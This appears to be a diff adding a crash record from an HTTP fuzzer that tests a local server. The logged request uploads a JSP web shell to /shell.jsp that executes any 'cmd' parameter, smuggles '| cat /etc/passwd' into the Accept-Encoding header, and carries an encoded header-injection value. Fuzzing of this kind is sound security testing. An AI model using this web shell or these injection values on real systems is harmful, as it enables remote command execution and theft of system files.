@@ -1,0 +1,23 @@
+{
+  "timestamp": "2025-12-29T14:40:16.898329",
+  "crash_type": "server_crash",
+  "payload": "PUT /shell.jsp?\nHeaders: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept-Encoding': '| cat /etc/passwd', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Rewrite-Url': '%e5%98%8a%e5%98%8d', 'Content-Range': 'bytes 0-100/101', 'Content-Length': '59'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "d913df28076b524d",
+  "request_method": "PUT",
+  "request_path": "/shell.jsp?",
+  "request_headers": {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Accept-Encoding": "| cat /etc/passwd",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Rewrite-Url": "%e5%98%8a%e5%98%8d",
+    "Content-Range": "bytes 0-100/101",
+    "Content-Length": "59"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 550
+}
